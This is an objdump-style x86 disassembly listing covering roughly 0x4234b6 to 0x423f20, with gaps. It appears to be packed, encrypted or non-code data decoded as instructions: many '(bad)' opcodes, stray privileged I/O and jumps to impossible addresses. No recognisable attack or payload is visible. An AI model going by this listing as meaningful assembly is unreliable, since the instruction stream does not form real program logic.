  4234b6:	mov    bl,BYTE PTR gs:[eax-0x38602cf9]
  4234bd:	dec    ebp
  4234be:	cmp    al,0xe0
  4234c0:	rcl    DWORD PTR [ebx-0x11ce69de],0xb9
  4234c7:	adc    BYTE PTR [esi-0x2d],dh
  4234ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234cb:	cdq    
  4234cc:	test   eax,0x3a345e60
  4234d1:	(bad)  
  4234d2:	mov    edi,0x796baafd
  4234d7:	mov    edx,0x96cccb07
  4234dc:	mov    DWORD PTR [edi],ebp
  4234de:	mov    dl,0xd8
  4234e0:	imul   DWORD PTR [edx]
  4234e2:	add    bh,BYTE PTR [eax+eax*8+0x3287a40d]
  4234e9:	lahf   
  4234ea:	cmp    al,0x5c
  4234ec:	mov    cl,0x2e
  4234ee:	ins    DWORD PTR es:[edi],dx
  4234ef:	push   0xfffffffe
  4234f1:	jle    0x4234f5
  4234f3:	and    BYTE PTR [edi],0xf9
  4234f6:	icebp  
  4234f7:	in     al,0x27
  4234f9:	xor    dh,ch
  4234fb:	repnz out 0x21,al
  4234fe:	jge    0x4234a3
  423500:	jmp    0xf1b42185
  423505:	pusha  
  423506:	mov    ecx,0x641a7496
  42350b:	mov    al,0x36
  42350d:	daa    
  42350e:	popa   
  42350f:	or     cl,dl
  423511:	push   DWORD PTR [edx-0x36a15105]
  423517:	into   
  423518:	mov    edi,0xd496c11f
  42351d:	aaa    
  42351e:	mov    esp,0xf4a6818a
  423523:	stc    
  423524:	adc    eax,0x85a6adaa
  423529:	mov    al,0xb1
  42352b:	add    ebp,DWORD PTR [eax-0x24]
  42352e:	inc    edx
  42352f:	pop    ecx
  423530:	hlt    
  423531:	ds push cs
  423533:	outs   dx,DWORD PTR ds:[esi]
  423534:	jns    0x423583
  423536:	ret    0x4fef
  423539:	adc    al,0x6c
  42353b:	jmp    0x4235bc
  42353d:	mov    esi,0xb28f653d
  423542:	lock jle 0x423523
  423545:	(bad)  
  423546:	imul   esi,DWORD PTR [ebx-0x537ae116],0x2b85738e
  423550:	dec    ecx
  423551:	aaa    
  423552:	fbld   TBYTE PTR [edx]
  423554:	jmp    0xfb35f1f0
  423559:	push   edi
  42355a:	clc    
  42355b:	or     ebx,eax
  42355d:	aam    0x7e
  42355f:	loop   0x4235a5
  423561:	cmp    eax,0x161d41c2
  423566:	fisub  DWORD PTR [edx+0x4485f1bf]
  42356c:	push   eax
  42356d:	pop    edi
  42356e:	mov    ebx,0xca6160dc
  423573:	or     al,0xf2
  423575:	sub    bl,BYTE PTR [esi+edi*8]
  423578:	inc    edx
  423579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42357a:	lahf   
  42357b:	scas   al,BYTE PTR es:[edi]
  42357c:	or     al,0x8e
  42357e:	mov    es,WORD PTR [edi]
  423580:	ret    0x6489
  423583:	outs   dx,DWORD PTR ds:[esi]
  423584:	or     al,0x8a
  423586:	mov    ch,0xf8
  423588:	inc    edi
  423589:	or     BYTE PTR [esi-0x1af31ab1],ch
  42358f:	data16 loope 0x423605
  423592:	sti    
  423593:	mov    ch,0x3b
  423595:	call   0x7a80667e
  42359a:	and    esp,esi
  42359c:	fist   DWORD PTR [edi+0x3]
  42359f:	sbb    esi,ecx
  4235a1:	mov    fs,WORD PTR [edx+0x4c]
  4235a4:	sbb    eax,0x86d82578
  4235a9:	stc    
  4235aa:	adc    eax,0xc77b60c
  4235af:	push   ss
  4235b0:	cmp    al,0x8f
  4235b2:	imul   esp,DWORD PTR ds:0x72,0x0
	...
  423614:	add    BYTE PTR [eax],al
  423616:	or     BYTE PTR [edi-0x8808b84],0x88
  42361d:	dec    DWORD PTR [eax+0x2d]
  423620:	push   0xffffffda
  423622:	scas   eax,DWORD PTR es:[edi]
  423623:	jne    0x4235c3
  423625:	adc    al,0x70
  423627:	js     0x42362a
  423629:	add    BYTE PTR [edi],al
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [ebp-0x668a8bb2],bl
  423633:	sbb    ecx,DWORD PTR [edi-0x60]
  423636:	dec    edx
  423637:	cmp    al,0x5a
  423639:	mov    al,ds:0x14548c78
  42363e:	jg     0x423666
  423640:	add    eax,0x9b3ea65a
  423645:	mov    ecx,DWORD PTR [ebx-0x76257ab4]
  42364b:	ret    
  42364c:	sbb    eax,0x3b1046d3
  423651:	rcl    DWORD PTR [ebx+eax*1-0x2c12efc4],0x16
  423659:	ret    
  42365a:	imul   ecx,DWORD PTR [edi+0x18],0x35
  42365e:	xlat   BYTE PTR ds:[ebx]
  42365f:	sbb    esp,DWORD PTR [ecx+edx*2+0xf]
  423663:	xchg   edx,eax
  423664:	jae    0x4236c8
  423666:	(bad)  
  423668:	xchg   DWORD PTR [edx+0x7489db6],edx
  42366e:	sbb    ebp,DWORD PTR [ebp+eiz*1+0x4f248f05]
  423675:	sti    
  423676:	shr    DWORD PTR [ebx],0x20
  423679:	test   eax,0x3428b581
  42367e:	push   ss
  42367f:	cwde   
  423680:	lahf   
  423681:	mov    al,ds:0x3bbaa5cd
  423686:	pop    ecx
  423687:	ds push edx
  423689:	or     DWORD PTR [eax+0x18],esi
  42368c:	mov    ds:0x20e3448f,eax
  423691:	push   ebp
  423692:	leave  
  423693:	push   0xd7419ac4
  423698:	pop    ebp
  42369a:	fsub   QWORD PTR [ecx]
  42369c:	icebp  
  42369d:	lods   eax,DWORD PTR ds:[esi]
  42369e:	dec    ebp
  42369f:	mov    al,ds:0x56a7ceab
  4236a4:	xchg   edx,edi
  4236a6:	adc    ebx,DWORD PTR [ecx+0x29]
  4236a9:	add    eax,edi
  4236ab:	dec    esp
  4236ac:	pop    esp
  4236ad:	sahf   
  4236ae:	dec    edx
  4236af:	xchg   ebp,ebp
  4236b1:	jmp    0x191273e8
  4236b6:	xor    al,BYTE PTR [edx+0x716924f6]
  4236bc:	loop   0x423642
  4236be:	xor    al,0xca
  4236c0:	and    edi,esp
  4236c2:	js     0x4236f0
  4236c4:	mov    ebp,0x87052519
  4236c9:	push   edx
  4236ca:	pop    edx
  4236cb:	add    eax,0x843d5aad
  4236d1:	test   eax,0xfa82bb09
  4236d6:	in     eax,dx
  4236d7:	xchg   ecx,eax
  4236d8:	imul   eax,DWORD PTR [esi+0x7b1661c8],0xf042977f
  4236e2:	add    DWORD PTR [esi+eax*1-0x6c],0x6a
  4236e7:	ins    BYTE PTR es:[edi],dx
  4236e8:	aaa    
  4236e9:	pop    edi
  4236ea:	xchg   ebp,eax
  4236eb:	bound  esp,QWORD PTR [ecx+0x3e88ed60]
  4236f1:	pop    ss
  4236f2:	daa    
  4236f3:	jle    0x423676
  4236f5:	pusha  
  4236f6:	int    0x28
  4236f8:	xor    BYTE PTR cs:[esi],bh
  4236fb:	sub    eax,0x962ed9ff
  423700:	add    al,BYTE PTR [edi-0x2c]
  423703:	mov    esi,es
  423705:	repnz lods eax,DWORD PTR ds:[esi]
  423707:	imul   ebx,DWORD PTR [ebp-0x643e2a16],0xffffffa2
  42370e:	sub    edx,DWORD PTR [eax+eax*2+0x2fb608b2]
  423715:	mov    ch,0xa3
  423717:	add    al,0x95
  423719:	cmp    DWORD PTR gs:[ecx-0x4b],eax
  42371d:	sbb    ebx,DWORD PTR [ebx+0x57d1e101]
  423723:	pop    ebx
  423724:	cmp    eax,0xeea24ffb
  423729:	sub    edx,DWORD PTR [ecx-0x16]
  42372c:	rol    BYTE PTR [eax],0x9e
  42372f:	or     dl,BYTE PTR ss:[ebp-0x1e]
  423733:	mov    ebx,0x5f
	...
  423794:	add    BYTE PTR [eax],al
  423796:	xor    al,0x23
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0xd4bbd0f
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [ebx],al
  4237af:	sub    esp,edi
  4237b1:	mul    ecx
  4237b3:	jl     0x423752
  4237b5:	hlt    
  4237b6:	jle    0x4237fe
  4237b8:	das    
  4237b9:	sub    al,0x75
  4237bb:	cmp    al,BYTE PTR [ebp+0x6]
  4237be:	sub    DWORD PTR [edi],0x4d
  4237c1:	nop
  4237c2:	call   0xf7120e
  4237c7:	(bad)  
  4237c8:	repnz nop
  4237ca:	repz cmp ebx,esi
  4237cd:	mov    ecx,0xab648979
  4237d2:	push   esp
  4237d3:	adc    eax,0xb58684cf
  4237d8:	and    ah,bh
  4237da:	pop    edx
  4237db:	push   esi
  4237dd:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237df:	(bad)  
  4237e0:	xor    eax,0xaaadb564
  4237e5:	inc    eax
  4237e6:	inc    ecx
  4237e7:	fnstsw WORD PTR [eax]
  4237e9:	add    DWORD PTR [ebx-0x4],ebx
  4237ec:	ins    DWORD PTR es:[edi],dx
  4237ed:	cmp    al,0x5a
  4237ef:	xor    edx,DWORD PTR [eax-0x1926a225]
  4237f5:	scas   al,BYTE PTR es:[edi]
  4237f6:	addr16 into 
  4237f8:	cdq    
  4237f9:	sti    
  4237fa:	pusha  
  4237fb:	ins    BYTE PTR es:[edi],dx
  4237fc:	pushf  
  4237fd:	push   ecx
  4237fe:	dec    edx
  4237ff:	out    0x0,al
  423801:	dec    ecx
  423802:	cld    
  423803:	cmp    ah,0xcc
  423806:	out    dx,eax
  423807:	nop
  423808:	sbb    eax,0xa15f6880
  42380d:	fmul   DWORD PTR [ecx]
  42380f:	xor    BYTE PTR [edx-0x55],cl
  423812:	aaa    
  423813:	ss aam 0x2f
  423816:	les    eax,FWORD PTR [edx-0x449991ab]
  42381c:	cwde   
  42381d:	test   DWORD PTR [ebx],ebp
  42381f:	inc    edx
  423820:	popf   
  423821:	scas   eax,DWORD PTR es:[edi]
  423822:	enter  0xc3e2,0x2a
  423826:	gs inc ebp
  423828:	xor    al,0x64
  42382a:	pop    edx
  42382b:	or     al,0x66
  42382d:	cmp    al,0x96
  42382f:	retf   0x6ca5
  423832:	jge    0x42381f
  423834:	pop    es
  423835:	test   eax,0x70b37f74
  42383a:	outs   dx,BYTE PTR ds:[esi]
  42383b:	icebp  
  42383c:	xor    BYTE PTR [esi+0x53ff5340],bh
  423842:	ror    cl,cl
  423844:	ins    BYTE PTR es:[edi],dx
  423845:	add    esi,eax
  423847:	jp     0x423853
  423849:	push   0x3ae5dfaa
  42384e:	sub    DWORD PTR [ebp-0x122a581a],ecx
  423854:	push   ecx
  423855:	(bad)  
  423856:	clc    
  423857:	add    ah,BYTE PTR [esi+0x11]
  42385a:	sbb    al,0x8c
  42385c:	jp     0x42386e
  42385e:	push   ss
  42385f:	repnz out dx,eax
  423861:	lds    eax,FWORD PTR [ecx]
  423863:	lock sub al,0x54
  423866:	mov    ebp,0x87105c7d
  42386b:	aad    0x2c
  42386d:	mov    dl,0x6d
  42386f:	add    DWORD PTR [ecx],edi
  423871:	fld    DWORD PTR ds:[ecx-0x54]
  423875:	loop   0x4238f1
  423877:	imul   eax,DWORD PTR ds:[edx+0x489c1d7b],0x905b8aa7
  423882:	pop    eax
  423883:	stos   DWORD PTR es:[edi],eax
  423884:	gs adc al,0xa0
  423887:	adc    DWORD PTR [ebx],esp
  423889:	aad    0x60
  42388b:	call   0xe8bf:0x86dc5690
  423892:	mov    ecx,0x6ef6dad5
  423897:	mov    esp,0xa2a975f6
  42389c:	adc    eax,esi
  42389e:	bound  ebp,QWORD PTR [eax]
  4238a0:	lahf   
  4238a1:	add    eax,DWORD PTR [ecx]
  4238a3:	aas    
  4238a4:	icebp  
  4238a5:	jl     0x42391e
  4238a7:	rol    DWORD PTR [ebx+0x2dfb3f20],1
  4238ad:	mov    ds:0x64b46133,al
  4238b2:	stos   DWORD PTR es:[edi],eax
  4238b3:	iret   
  4238b4:	popa   
	...
  423915:	add    BYTE PTR [edx-0x770e5c],cl
  42391b:	(bad)  
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    eax,ebp
  423923:	std    
  423924:	scas   al,BYTE PTR es:[edi]
  423925:	and    edi,DWORD PTR [esi+0x7a]
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    BYTE PTR [ebx],bh
  42392f:	ret    0x4480
  423932:	jno    0x4238e8
  423934:	out    dx,al
  423935:	lea    ebp,[esi-0x207aaf8c]
  42393b:	into   
  42393c:	lock xchg esi,eax
  42393e:	xor    ebp,edx
  423940:	sbb    eax,0x4e599dad
  423945:	fs (bad) 
  423947:	sub    esi,DWORD PTR [edx+0x301f41bf]
  42394d:	mov    bl,0xf
  42394f:	xor    al,BYTE PTR [edx]
  423951:	lock xor BYTE PTR [esi-0x6a],0x97
  423956:	loope  0x42397b
  423958:	xor    al,0x4a
  42395a:	push   ss
  42395b:	mov    ds:0x74b0496d,al
  423960:	fbstp  TBYTE PTR [ecx-0x27]
  423963:	push   ebp
  423964:	out    0x26,eax
  423966:	xor    al,0x6c
  423968:	jp     0x423959
  42396a:	stos   BYTE PTR es:[edi],al
  42396b:	mov    eax,0x6769d9dc
  423970:	jl     0x423946
  423972:	inc    esp
  423973:	out    dx,al
  423974:	cld    
  423975:	xor    al,0x53
  423977:	stos   BYTE PTR es:[edi],al
  423978:	mov    edx,0xba3d601e
  42397d:	cmc    
  42397e:	scas   eax,DWORD PTR es:[edi]
  42397f:	jbe    0x4239cf
  423981:	sahf   
  423982:	nop
  423983:	fstp   TBYTE PTR [ebx]
  423985:	sub    esp,ecx
  423987:	xchg   bh,ah
  423989:	in     eax,0xe7
  42398b:	outs   dx,DWORD PTR ds:[esi]
  42398c:	aaa    
  42398d:	lds    edi,FWORD PTR [edi+0x30fb8e7b]
  423993:	fisttp DWORD PTR [edx+0x0]
  423996:	in     al,dx
  423997:	cdq    
  423998:	xchg   DWORD PTR [eax+0xfec219b],eax
  42399e:	and    al,ch
  4239a0:	out    dx,al
  4239a1:	outs   dx,DWORD PTR ds:[esi]
  4239a2:	xchg   esp,eax
  4239a3:	shl    ecx,cl
  4239a5:	push   eax
  4239a6:	push   ecx
  4239a7:	xor    eax,0xb4915710
  4239ac:	data16 or al,0xb9
  4239af:	popa   
  4239b0:	ins    BYTE PTR es:[edi],dx
  4239b1:	dec    edx
  4239b2:	in     al,dx
  4239b3:	xchg   edx,eax
  4239b4:	ret    
  4239b5:	pop    ebp
  4239b6:	mov    ebx,0x9b531b2a
  4239bb:	and    DWORD PTR [eax],esp
  4239bd:	push   edi
  4239be:	or     cl,dl
  4239c0:	mov    edx,0xc562ebd5
  4239c5:	js     0x423a29
  4239c7:	xor    DWORD PTR [eax-0x4eef8071],ebp
  4239cd:	js     0x423971
  4239cf:	and    bl,BYTE PTR [ebx]
  4239d1:	dec    edx
  4239d2:	int3   
  4239d3:	adc    BYTE PTR [edi],ah
  4239d5:	ins    BYTE PTR es:[edi],dx
  4239d6:	(bad)  
  4239d7:	out    0xad,al
  4239d9:	ins    DWORD PTR es:[edi],dx
  4239da:	movd   mm0,DWORD PTR [ecx-0x4081e41a]
  4239e1:	cs sbb dl,dh
  4239e4:	pop    es
  4239e5:	gs add al,0x48
  4239e8:	(bad)  
  4239e9:	mov    ds:0x399157b1,al
  4239ee:	sbb    BYTE PTR [esi+edi*4-0x41e87cf1],ah
  4239f5:	cmp    ebx,esp
  4239f7:	mov    es,WORD PTR [edx+0x1b78d764]
  4239fd:	sub    DWORD PTR [edi+edi*1-0x33],ebp
  423a01:	inc    eax
  423a02:	call   0x9540:0xf3118b11
  423a09:	sbb    DWORD PTR [ecx+ebp*1+0x36],edx
  423a0d:	int    0xe2
  423a0f:	dec    edx
  423a10:	inc    ecx
  423a11:	js     0x4239db
  423a13:	add    ebx,DWORD PTR [ebx]
  423a15:	out    0xa3,al
  423a17:	add    BYTE PTR [ebx+0x73],cl
  423a1a:	fisttp QWORD PTR [esi]
  423a1c:	xchg   ebp,eax
  423a1d:	jl     0x423a9e
  423a1f:	sar    al,cl
  423a21:	lahf   
  423a22:	popw   ds
  423a24:	push   esp
  423a25:	inc    ebp
  423a26:	push   edi
  423a27:	shl    ecx,cl
  423a29:	push   ss
  423a2a:	and    al,0x9
  423a2c:	pop    esi
  423a2d:	dec    ecx
  423a2e:	jno    0x4239bd
  423a30:	inc    ebx
  423a31:	(bad)  
  423a33:	bndstx [eax],bnd0
	...
  423a96:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	ret    0x4203
  423aa5:	xlat   BYTE PTR ds:[ebx]
  423aa6:	test   DWORD PTR [ebx+0x1],edi
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    dh,cl
  423aaf:	pushw  0xff9c
  423ab2:	adc    al,0x3c
  423ab4:	dec    edi
  423ab5:	xor    dh,BYTE PTR ds:0x984b1901
  423abb:	ins    BYTE PTR es:[edi],dx
  423abc:	xchg   esp,eax
  423abd:	inc    edi
  423abe:	sub    DWORD PTR [edx-0x31],esi
  423ac1:	addr16 jl 0x423a8d
  423ac4:	ror    DWORD PTR [edi+0x39],1
  423ac7:	mov    eax,ds:0x19711d95
  423acc:	dec    esp
  423acd:	imul   dh
  423acf:	mov    al,ds:0xe9bc6f20
  423ad4:	jae    0x423b20
  423ad6:	mov    DWORD PTR [ecx-0x44],edx
  423ad9:	adc    esi,DWORD PTR [edx+0x3ea15374]
  423adf:	add    eax,0x7af0dedf
  423ae4:	lea    eax,ds:0x1bdc574b
  423aea:	add    DWORD PTR [ecx-0x26],edi
  423aed:	xor    BYTE PTR [edi+0x61e69684],0x99
  423af4:	outs   dx,BYTE PTR ds:[esi]
  423af5:	sub    al,0x8d
  423af7:	pop    es
  423af8:	jbe    0x423b3a
  423afa:	imul   esi,DWORD PTR [ebx-0x477f1a28],0x4c
  423b01:	out    dx,eax
  423b02:	xchg   ebp,eax
  423b03:	adc    DWORD PTR [edi-0x12],edi
  423b06:	stos   BYTE PTR es:[edi],al
  423b07:	jp     0x423a8e
  423b09:	pop    edi
  423b0a:	in     al,0xf5
  423b0c:	outs   dx,BYTE PTR ds:[esi]
  423b0d:	jge    0x423b0a
  423b0f:	cmp    eax,0x21217852
  423b14:	sbb    cl,BYTE PTR [edi]
  423b16:	(bad)  
  423b17:	fisttp QWORD PTR [eax+0x1ca146f1]
  423b1d:	push   cs
  423b1e:	add    al,0xbb
  423b20:	inc    esp
  423b21:	lock and al,0x42
  423b24:	dec    ebp
  423b25:	mov    al,ds:0xde9d25be
  423b2a:	mov    ch,0xbd
  423b2c:	inc    ecx
  423b2d:	inc    ebx
  423b2e:	mov    ah,0x62
  423b30:	fdivr  QWORD PTR [edi+0x5f]
  423b33:	ret    
  423b34:	shl    BYTE PTR [ebp+0x1e],0xeb
  423b38:	fmul   st,st(0)
  423b3a:	imul   BYTE PTR [eax-0x38]
  423b3d:	cs mov bl,cl
  423b40:	arpl   WORD PTR [edi+0x6bf6414e],bx
  423b46:	call   0xd6d5:0x10ff48a9
  423b4d:	test   cl,dl
  423b4f:	push   eax
  423b50:	jno    0x423bae
  423b52:	nop
  423b53:	mov    BYTE PTR [ecx+0x26],0xd0
  423b57:	dec    ebp
  423b58:	push   ds
  423b59:	mov    esi,0xd445e498
  423b5e:	in     al,0xad
  423b60:	mov    ss,WORD PTR [ecx-0x7951555]
  423b66:	add    eax,0x33048a3
  423b6b:	and    BYTE PTR [eax+0x7],0x1e
  423b6f:	mov    eax,0xb3437fc6
  423b74:	xchg   ebx,eax
  423b75:	push   es
  423b76:	pop    es
  423b77:	in     al,0xaa
  423b79:	add    edx,DWORD PTR [esi+0x47]
  423b7c:	mov    bl,0x11
  423b7e:	out    0xce,al
  423b80:	js     0x423b63
  423b82:	fcomi  st,st(1)
  423b84:	push   ebp
  423b85:	into   
  423b86:	int    0x0
  423b88:	jmp    0x423b13
  423b8a:	jns    0x423b67
  423b8c:	cwde   
  423b8d:	mul    esp
  423b8f:	jbe    0x423ba0
  423b91:	shr    BYTE PTR [edi],0x73
  423b94:	push   ebp
  423b95:	and    esp,DWORD PTR [ebx-0x44]
  423b98:	pop    ebx
  423b99:	jbe    0x423b53
  423b9b:	in     eax,dx
  423b9c:	or     DWORD PTR [edi-0x67],esi
  423b9f:	ja     0x423b6c
  423ba1:	rcl    edx,cl
  423ba3:	repnz push edx
  423ba5:	cmp    edx,edi
  423ba7:	mov    BYTE PTR gs:[edi+0x1dcb863c],ch
  423bae:	sbb    eax,0x649e2e72
  423bb3:	test   ecx,esi
	...
  423c15:	add    ch,bh
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	push   0x45
  423c24:	popf   
  423c25:	mov    WORD PTR ds:[ecx+eax*1+0x0],?
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR ds:0xe8123d42,ch
  423c33:	or     ebx,ebp
  423c35:	jnp    0x423bbd
  423c37:	std    
  423c38:	push   0x2d
  423c3a:	push   ebx
  423c3b:	cmp    BYTE PTR [esi],bh
  423c3d:	imul   edx,ecx,0x91fbd1cd
  423c43:	xchg   ebx,eax
  423c44:	jmp    0x6511:0xd8603fc7
  423c4b:	mov    ah,0xb8
  423c4d:	icebp  
  423c4e:	shr    BYTE PTR [ebp+0x1d],cl
  423c51:	mov    ebp,0xc20598d2
  423c56:	aas    
  423c57:	xor    al,0xeb
  423c59:	add    eax,0x5747f37d
  423c5e:	xor    eax,0x745c4b11
  423c63:	inc    edi
  423c64:	iret   
  423c65:	test   BYTE PTR [bp+si],dh
  423c68:	in     al,dx
  423c69:	aaa    
  423c6a:	sub    eax,0xc2abf78a
  423c6f:	mov    edx,0x8044840f
  423c74:	pop    eax
  423c75:	(bad)  
  423c76:	enter  0x3225,0x49
  423c7a:	xor    ah,BYTE PTR [esi+edi*8-0x29]
  423c7e:	sub    ebp,eax
  423c80:	mov    dh,0x8c
  423c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c83:	mov    cl,BYTE PTR [eax-0x57]
  423c86:	test   BYTE PTR [esi-0x33],cl
  423c89:	imul   eax,esp,0x8d371f34
  423c8f:	push   0x9
  423c91:	and    al,0x6a
  423c93:	inc    ecx
  423c94:	jmp    0x423cab
  423c96:	xor    al,0x38
  423c98:	mov    ?,WORD PTR [eax+0x6327619e]
  423c9e:	sar    DWORD PTR [edx-0x72cac8ef],cl
  423ca4:	adc    eax,0x64910257
  423ca9:	or     eax,0xc4f22a27
  423cae:	mov    dh,0x5b
  423cb0:	dec    esi
  423cb1:	jg     0x423c4c
  423cb3:	stos   DWORD PTR es:[edi],eax
  423cb4:	push   esi
  423cb5:	xchg   ebp,eax
  423cb6:	add    al,0x6d
  423cb8:	adc    DWORD PTR [eax],0xffffffb1
  423cbb:	int3   
  423cbc:	jl     0x423d09
  423cbe:	inc    ecx
  423cbf:	inc    edx
  423cc0:	aaa    
  423cc1:	inc    ebx
  423cc2:	fcom   DWORD PTR [edx+0x5e]
  423cc5:	sahf   
  423cc6:	add    ebx,esi
  423cc8:	jg     0x423d32
  423cca:	iret   
  423ccb:	dec    edi
  423ccc:	or     BYTE PTR [ebp-0x316fb288],0x57
  423cd3:	sub    al,0xb0
  423cd5:	call   0x1c9cedd9
  423cda:	ror    BYTE PTR [ecx+0x31a534ff],1
  423ce0:	lahf   
  423ce1:	xchg   ebx,eax
  423ce2:	ss push ebx
  423ce4:	jne    0x423cc7
  423ce6:	in     al,dx
  423ce7:	outs   dx,DWORD PTR ds:[esi]
  423ce8:	enter  0xff43,0xdb
  423cec:	cmp    DWORD PTR [eax],edx
  423cee:	mov    WORD PTR [ebx],?
  423cf0:	push   eax
  423cf1:	outs   dx,DWORD PTR ds:[esi]
  423cf2:	das    
  423cf3:	je     0x423c77
  423cf5:	inc    ecx
  423cf6:	mov    al,ds:0x19de5dda
  423cfb:	sub    eax,0x4d38aee6
  423d00:	mov    bl,ah
  423d02:	stos   BYTE PTR es:[edi],al
  423d03:	xor    DWORD PTR [esi+0x1],eax
  423d06:	fs jg  0x423d11
  423d09:	sbb    DWORD PTR fs:0x73b5a5ad,eax
  423d10:	jnp    0x423ca6
  423d12:	inc    edi
  423d13:	jle    0x423d41
  423d15:	jno    0x423d3b
  423d17:	jo     0x423d45
  423d19:	xor    eax,0x8eb39e63
  423d1e:	sbb    al,0x37
  423d20:	fist   WORD PTR [eax]
  423d22:	ja     0x423cf2
  423d24:	cmp    ebx,DWORD PTR [edi+0x71fc9d5c]
  423d2a:	aam    0x3f
  423d2c:	cmc    
  423d2d:	aam    0xd8
  423d2f:	popa   
  423d30:	or     eax,0xd19b03ac
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	lea    ebp,[eax]
  423da4:	in     eax,0x79
  423da6:	xchg   ebx,eax
  423da7:	jge    0x423daa
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [esp+ebp*8+0x581883d7],ch
  423db4:	sub    al,0x5a
  423db6:	and    ecx,ebx
  423db8:	jne    0x423dce
  423dba:	int    0xbf
  423dbc:	icebp  
  423dbd:	sub    al,0x1a
  423dbf:	in     eax,dx
  423dc0:	enter  0x350e,0x0
  423dc4:	mov    edx,0x5c0dc720
  423dc9:	sub    al,0x34
  423dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dcc:	mov    edi,0xd9f670cf
  423dd1:	aam    0x51
  423dd3:	xor    bl,0x4e
  423dd6:	sahf   
  423dd7:	arpl   WORD PTR [esi-0x101f4dd3],ax
  423ddd:	mov    ah,0x2
  423ddf:	dec    esi
  423de0:	sub    eax,0x5650c8d8
  423de5:	mov    cl,0x9d
  423de7:	inc    ebp
  423de8:	int    0x1e
  423dea:	lea    edi,fs:[eax-0x5a]
  423dee:	ficom  DWORD PTR [ebp+edx*1+0x498ff974]
  423df5:	lods   eax,DWORD PTR ds:[esi]
  423df6:	and    eax,DWORD PTR [edi-0x36]
  423df9:	retf   0x527b
  423dfc:	sub    dh,al
  423dfe:	pop    edx
  423dff:	test   eax,0x7b63ed47
  423e04:	jmp    0x423dd1
  423e06:	adc    BYTE PTR [edx+ebp*8-0x66],dh
  423e0a:	inc    esp
  423e0b:	cwde   
  423e0c:	jb     0x423e61
  423e0e:	xor    esi,edx
  423e10:	int    0x1f
  423e12:	mov    BYTE PTR [edi-0x24],ah
  423e15:	sahf   
  423e16:	push   edi
  423e17:	mov    ebp,0xd8d64e4b
  423e1c:	pop    eax
  423e1d:	xor    eax,0x34de9437
  423e22:	fwait
  423e23:	js     0x423df1
  423e25:	dec    ebx
  423e26:	inc    edi
  423e27:	push   cs
  423e28:	repz mov esp,0xaa77177a
  423e2e:	and    BYTE PTR [ecx],bh
  423e30:	stos   DWORD PTR es:[edi],eax
  423e31:	lods   eax,DWORD PTR ds:[esi]
  423e32:	dec    ecx
  423e33:	push   ds
  423e34:	xor    al,BYTE PTR [edx+0x2f]
  423e37:	sar    BYTE PTR [eax-0x4b7cb562],1
  423e3d:	int3   
  423e3e:	mov    edx,0x3022b9d8
  423e43:	pushw  0x45
  423e46:	repnz push 0xf3b2f300
  423e4c:	out    0x30,al
  423e4e:	leave  
  423e4f:	lods   eax,DWORD PTR ds:[esi]
  423e50:	cmc    
  423e51:	adc    al,0x70
  423e53:	xchg   ebx,eax
  423e54:	aam    0xb4
  423e56:	pop    esp
  423e57:	pop    ecx
  423e58:	xor    DWORD PTR [edi-0x5d],eax
  423e5b:	adc    eax,0x8e7004fe
  423e60:	xchg   edx,eax
  423e61:	test   dh,dh
  423e63:	push   esp
  423e64:	enter  0x342f,0xc3
  423e68:	xchg   BYTE PTR [edx],dh
  423e6a:	fisubr DWORD PTR cs:[esi+0x33]
  423e6e:	jge    0x423ee6
  423e70:	aas    
  423e71:	rol    esi,1
  423e73:	leave  
  423e74:	ret    0x31bc
  423e77:	std    
  423e78:	js     0x423e19
  423e7a:	stos   BYTE PTR es:[edi],al
  423e7b:	loopne 0x423ec1
  423e7d:	sub    al,0x30
  423e7f:	pop    eax
  423e80:	popf   
  423e81:	jp     0x423e35
  423e83:	fxch   st(4)
  423e85:	jo     0x423ea8
  423e87:	sbb    al,0x75
  423e89:	daa    
  423e8a:	inc    ecx
  423e8b:	sbb    DWORD PTR [ebp-0x2622b342],ebx
  423e91:	(bad)  
  423e92:	jl     0x423ed5
  423e94:	mov    bh,0xc9
  423e96:	popa   
  423e97:	test   al,0x3a
  423e99:	xchg   DWORD PTR [ebx-0xb],edi
  423e9c:	verr   si
  423e9f:	fistp  QWORD PTR ds:0xd4b7ae37
  423ea5:	jb     0x423f0f
  423ea7:	in     al,0xa4
  423ea9:	(bad)  
  423eaa:	ins    BYTE PTR es:[edi],dx
  423eab:	xchg   ebp,eax
  423eac:	in     eax,dx
  423ead:	(bad)  
  423eaf:	add    eax,0x53eff8eb
  423eb4:	cmp    al,0x0
	...
  423f16:	scas   al,BYTE PTR es:[edi]
  423f17:	call   0x9fff:0xff74b964
  423f1e:	xor    ebp,esi
  423f20:	xchg   BYTE PTR [eax-0x1d],dl
